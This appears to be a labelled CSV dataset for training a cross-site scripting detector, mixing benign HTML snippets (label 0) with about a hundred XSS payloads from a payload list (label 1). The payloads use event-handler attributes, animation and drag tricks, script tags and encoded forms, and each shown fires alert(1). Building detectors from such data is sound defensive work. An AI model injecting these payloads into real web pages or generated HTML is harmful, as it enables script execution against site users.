text,label,source,length,timestamp
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.730765
"<kbd oncontextmenu=""alert(1)"">test</kbd>",1,payloadbox,40,2026-02-09T15:05:27.718768
"<strong onkeydown=""alert(1)"" contenteditable>test</strong>",1,payloadbox,58,2026-02-09T15:05:27.721766
<spacer id=x tabindex=1 onfocusin=alert(1)></spacer>,1,payloadbox,52,2026-02-09T15:05:27.720768
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.730765
"<data oncontextmenu=""alert(1)"">test</data>",1,payloadbox,42,2026-02-09T15:05:27.715767
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.730765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.743765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.740766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.736778
<p>About</p>,0,generated,12,2026-02-09T15:05:27.738766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.730765
"<canvas onbeforecopy=""alert(1)"" contenteditable>test</canvas>",1,payloadbox,61,2026-02-09T15:05:27.715767
"<div draggable=""true"" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>",1,payloadbox,113,2026-02-09T15:05:27.716766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.731765
"<! foo=""><script>alert(91)</script>"">",1,payloadbox,37,2026-02-09T15:05:27.725769
"<input draggable=""true"" ondragenter=""alert(1)"">test</input>",1,payloadbox,59,2026-02-09T15:05:27.718768
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onanimationstart=""alert(1)""></applet>",1,payloadbox,99,2026-02-09T15:05:27.722765
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></em>",1,payloadbox,174,2026-02-09T15:05:27.722765
<em id=x tabindex=1 onfocus=alert(1)></em>,1,payloadbox,42,2026-02-09T15:05:27.716766
"<html draggable=""true"" ondragleave=""alert(1)"">test</html>",1,payloadbox,57,2026-02-09T15:05:27.717767
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.731765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.727768
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.741766
"<abbr onbeforecopy=""alert(1)"" contenteditable>test</abbr>",1,payloadbox,57,2026-02-09T15:05:27.714766
"<content onmouseleave=""alert(1)"">test</content>",1,payloadbox,47,2026-02-09T15:05:27.715767
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>,1,payloadbox,81,2026-02-09T15:05:27.724768
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.739765
<th id=x tabindex=1 onbeforeactivate=alert(1)></th>,1,payloadbox,51,2026-02-09T15:05:27.723765
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.739765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.734777
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.736778
"<div draggable=""true"" contenteditable>drag me</div><s ondragover=alert(1) contenteditable>drop here</s>",1,payloadbox,103,2026-02-09T15:05:27.716766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.726766
"<style>@keyframes slidein {}</style><table style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></table>",1,payloadbox,164,2026-02-09T15:05:27.722765
"<base onmousedown=""alert(1)"">test</base>",1,payloadbox,40,2026-02-09T15:05:27.714766
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.730765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.736778
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.728766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.729765
<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>,1,payloadbox,52,2026-02-09T15:05:27.717767
<span class='class-1264'>Services</span>,0,generated,40,2026-02-09T15:05:27.728766
"<keygen onmousemove=""alert(1)"">test</keygen>",1,payloadbox,44,2026-02-09T15:05:27.718768
"<rp onclick=""alert(1)"">test</rp>",1,payloadbox,32,2026-02-09T15:05:27.720768
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.739765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.732765
"<bdo oncut=""alert(1)"" contenteditable>test</bdo>",1,payloadbox,48,2026-02-09T15:05:27.714766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.735774
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.743765
"<noframes onmousedown=""alert(1)"">test</noframes>",1,payloadbox,48,2026-02-09T15:05:27.719771
<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,1,payloadbox,56,2026-02-09T15:05:27.720768
"<frame oncut=""alert(1)"" contenteditable>test</frame>",1,payloadbox,52,2026-02-09T15:05:27.717767
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.727768
<th id=x tabindex=1 onfocus=alert(1)></th>,1,payloadbox,42,2026-02-09T15:05:27.723765
"<style>:target {color:red;}</style><figcaption id=x style=""transition:color 1s"" ontransitionend=alert(1)></figcaption>",1,payloadbox,118,2026-02-09T15:05:27.721766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.731765
"<br draggable=""true"" ondrag=""alert(1)"">test</br>",1,payloadbox,48,2026-02-09T15:05:27.715767
<span class='class-3734'>Services</span>,0,generated,40,2026-02-09T15:05:27.736778
"<i onmouseup=""alert(1)"">test</i>",1,payloadbox,32,2026-02-09T15:05:27.717767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.733766
"<dd draggable=""true"" ondragend=""alert(1)"">test</dd>",1,payloadbox,51,2026-02-09T15:05:27.715767
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.731765
<span class='class-6154'>Services</span>,0,generated,40,2026-02-09T15:05:27.742765
<span class='class-3014'>Services</span>,0,generated,40,2026-02-09T15:05:27.733766
"<nav onclick=""alert(1)"">test</nav>",1,payloadbox,34,2026-02-09T15:05:27.719771
"<html ondblclick=""alert(1)"">test</html>",1,payloadbox,39,2026-02-09T15:05:27.717767
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hr>",1,payloadbox,174,2026-02-09T15:05:27.722765
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.729765
<span class='class-1724'>Services</span>,0,generated,40,2026-02-09T15:05:27.730765
"<content oncontextmenu=""alert(1)"">test</content>",1,payloadbox,48,2026-02-09T15:05:27.715767
<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>,1,payloadbox,64,2026-02-09T15:05:27.715767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.739765
"<summary oncontextmenu=""alert(1)"">test</summary>",1,payloadbox,48,2026-02-09T15:05:27.722765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.738766
<span class='class-1924'>Services</span>,0,generated,40,2026-02-09T15:05:27.730765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.743765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.734777
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.725769
"<main onbeforecut=""alert(1)"" contenteditable>test</main>",1,payloadbox,56,2026-02-09T15:05:27.718768
<span class='class-4084'>Services</span>,0,generated,40,2026-02-09T15:05:27.737767
"<bdi onmouseenter=""alert(1)"">test</bdi>",1,payloadbox,39,2026-02-09T15:05:27.714766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.728766
<em id=x tabindex=1 onbeforedeactivate=alert(1)></em><input autofocus>,1,payloadbox,70,2026-02-09T15:05:27.716766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.727768
"<multicol oncontextmenu=""alert(1)"">test</multicol>",1,payloadbox,50,2026-02-09T15:05:27.719771
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.734777
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.743765
"<div draggable=""true"" contenteditable>drag me</div><th ondragover=alert(1) contenteditable>drop here</th>",1,payloadbox,105,2026-02-09T15:05:27.716766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.726766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.743765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.730765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.743765
"<label onmouseout=""alert(1)"">test</label>",1,payloadbox,41,2026-02-09T15:05:27.718768
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.728766
<%78 onxxx=1,1,payloadbox,12,2026-02-09T15:05:27.713767
<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>,1,payloadbox,66,2026-02-09T15:05:27.715767
"<tbody onmouseleave=""alert(1)"">test</tbody>",1,payloadbox,43,2026-02-09T15:05:27.723765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.736778
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.731765
"<body onmouseleave=""alert(1)"">test</body>",1,payloadbox,41,2026-02-09T15:05:27.715767
<multicol id=x tabindex=1 onactivate=alert(1)></multicol>,1,payloadbox,57,2026-02-09T15:05:27.719771
<span class='class-2504'>Services</span>,0,generated,40,2026-02-09T15:05:27.732765
"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",1,payloadbox,113,2026-02-09T15:05:27.716766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.742765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.743765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.732765
<keygen onblur=alert(1) tabindex=1 id=x></keygen><input autofocus>,1,payloadbox,66,2026-02-09T15:05:27.718768
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.733766
"<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationstart=""alert(1)""></frame>",1,payloadbox,97,2026-02-09T15:05:27.722765
<keygen id=x tabindex=1 onactivate=alert(1)></keygen>,1,payloadbox,53,2026-02-09T15:05:27.718768
<span class='class-1674'>Services</span>,0,generated,40,2026-02-09T15:05:27.729765
"<object onbeforepaste=""alert(1)"" contenteditable>test</object>",1,payloadbox,62,2026-02-09T15:05:27.719771
<p>About</p>,0,generated,12,2026-02-09T15:05:27.734777
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationstart=""alert(1)""></element>",1,payloadbox,101,2026-02-09T15:05:27.722765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.737767
<col id=x tabindex=1 onfocusin=alert(1)></col>,1,payloadbox,46,2026-02-09T15:05:27.715767
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.737767
"<shadow draggable=""true"" ondragleave=""alert(1)"">test</shadow>",1,payloadbox,61,2026-02-09T15:05:27.720768
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.739765
"<time ondblclick=""alert(1)"">test</time>",1,payloadbox,39,2026-02-09T15:05:27.723765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.743765
"<legend onclick=""alert(1)"">test</legend>",1,payloadbox,40,2026-02-09T15:05:27.718768
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.727768
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.742765
"<p onpaste=""alert(1)"" contenteditable>test</p>",1,payloadbox,46,2026-02-09T15:05:27.719771
<p>About</p>,0,generated,12,2026-02-09T15:05:27.736778
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.729765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.730765
<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>,1,payloadbox,66,2026-02-09T15:05:27.719771
"<noembed ondblclick=""alert(1)"">test</noembed>",1,payloadbox,45,2026-02-09T15:05:27.719771
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.738766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.731765
<span class='class-3544'>Services</span>,0,generated,40,2026-02-09T15:05:27.735774
<span class='class-4724'>Services</span>,0,generated,40,2026-02-09T15:05:27.739765
"<tr onmouseup=""alert(1)"">test</tr>",1,payloadbox,34,2026-02-09T15:05:27.723765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.734777
<svg><small onload=alert(1)></small>,1,payloadbox,36,2026-02-09T15:05:27.723765
"<dialog onkeyup=""alert(1)"" contenteditable>test</dialog>",1,payloadbox,56,2026-02-09T15:05:27.716766
"<div draggable=""true"" contenteditable>drag me</div><content ondragover=alert(1) contenteditable>drop here</content>",1,payloadbox,115,2026-02-09T15:05:27.716766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.732765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.732765
<script id=x tabindex=1 onfocus=alert(1)></script>,1,payloadbox,50,2026-02-09T15:05:27.720768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.736778
"<pre onmousemove=""alert(1)"">test</pre>",1,payloadbox,38,2026-02-09T15:05:27.720768
"<img draggable=""true"" ondragenter=""alert(1)"">test</img>",1,payloadbox,55,2026-02-09T15:05:27.717767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.732765
"<li onmouseup=""alert(1)"">test</li>",1,payloadbox,34,2026-02-09T15:05:27.718768
<form action=javascript:alert(1)><input type=submit>,1,payloadbox,52,2026-02-09T15:05:27.713767
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.739765
"<p draggable=""true"" ondrag=""alert(1)"">test</p>",1,payloadbox,46,2026-02-09T15:05:27.719771
"<area onpaste=""alert(1)"" contenteditable>test</area>",1,payloadbox,52,2026-02-09T15:05:27.714766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.738766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.739765
<span class='class-754'>Services</span>,0,generated,39,2026-02-09T15:05:27.727768
"<svg onmousemove=""alert(1)"">test</svg>",1,payloadbox,38,2026-02-09T15:05:27.722765
"<div draggable=""true"" contenteditable>drag me</div><param ondragover=alert(1) contenteditable>drop here</param>",1,payloadbox,111,2026-02-09T15:05:27.716766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.731765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.739765
<caption id=x tabindex=1 onbeforeactivate=alert(1)></caption>,1,payloadbox,61,2026-02-09T15:05:27.715767
<p>About</p>,0,generated,12,2026-02-09T15:05:27.726766
<span class='class-4684'>Services</span>,0,generated,40,2026-02-09T15:05:27.738766
"<div draggable=""true"" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>",1,payloadbox,103,2026-02-09T15:05:27.716766
"<figcaption draggable=""true"" ondragenter=""alert(1)"">test</figcaption>",1,payloadbox,69,2026-02-09T15:05:27.717767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.740766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.735774
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.729765
"<multicol draggable=""true"" ondragleave=""alert(1)"">test</multicol>",1,payloadbox,65,2026-02-09T15:05:27.719771
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.727768
"<embed oncopy=""alert(1)"" contenteditable>test</embed>",1,payloadbox,53,2026-02-09T15:05:27.717767
<body onhashchange=alert(1)><a href=#x>click this!#x,1,payloadbox,52,2026-02-09T15:05:27.714766
"<b onmouseout=""alert(1)"">test</b>",1,payloadbox,33,2026-02-09T15:05:27.714766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.730765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.736778
"<style onmouseup=""alert(1)"">test</style>",1,payloadbox,40,2026-02-09T15:05:27.721766
<span class='class-2544'>Services</span>,0,generated,40,2026-02-09T15:05:27.732765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.739765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.729765
"<wbr onmousemove=""alert(1)"">test</wbr>",1,payloadbox,38,2026-02-09T15:05:27.724768
<span class='class-4384'>Services</span>,0,generated,40,2026-02-09T15:05:27.738766
"<datalist onkeypress=""alert(1)"" contenteditable>test</datalist>",1,payloadbox,63,2026-02-09T15:05:27.715767
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.730765
"<map onmouseout=""alert(1)"">test</map>",1,payloadbox,37,2026-02-09T15:05:27.718768
"<style>@keyframes slidein {}</style><marquee style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></marquee>",1,payloadbox,168,2026-02-09T15:05:27.721766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.743765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.741766
"<frameset ondblclick=""alert(1)"">test</frameset>",1,payloadbox,47,2026-02-09T15:05:27.717767
<output id=x tabindex=1 onbeforeactivate=alert(1)></output>,1,payloadbox,59,2026-02-09T15:05:27.719771
"<thead ondblclick=""alert(1)"">test</thead>",1,payloadbox,41,2026-02-09T15:05:27.723765
<span class='class-3144'>Services</span>,0,generated,40,2026-02-09T15:05:27.734777
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.728766
"<style>@keyframes x{}</style><base style=""animation-name:x"" onanimationend=""alert(1)""></base>",1,payloadbox,93,2026-02-09T15:05:27.722765
"<title draggable=""true"" ondragstart=""alert(1)"">test</title>",1,payloadbox,59,2026-02-09T15:05:27.723765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.740766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.733766
<nav id=x tabindex=1 onbeforeactivate=alert(1)></nav>,1,payloadbox,53,2026-02-09T15:05:27.719771
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.736778
"<template onmouseenter=""alert(1)"">test</template>",1,payloadbox,49,2026-02-09T15:05:27.723765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.727768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.739765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.741766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.727768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.739765
<svg><caption onload=alert(1)></caption>,1,payloadbox,40,2026-02-09T15:05:27.723765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.740766
"<head onmouseover=""alert(1)"">test</head>",1,payloadbox,40,2026-02-09T15:05:27.717767
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.730765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.742765
"<dd draggable=""true"" ondrag=""alert(1)"">test</dd>",1,payloadbox,48,2026-02-09T15:05:27.715767
%3Cx onxxx=alert(1),1,payloadbox,19,2026-02-09T15:05:27.713767
<code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>,1,payloadbox,74,2026-02-09T15:05:27.715767
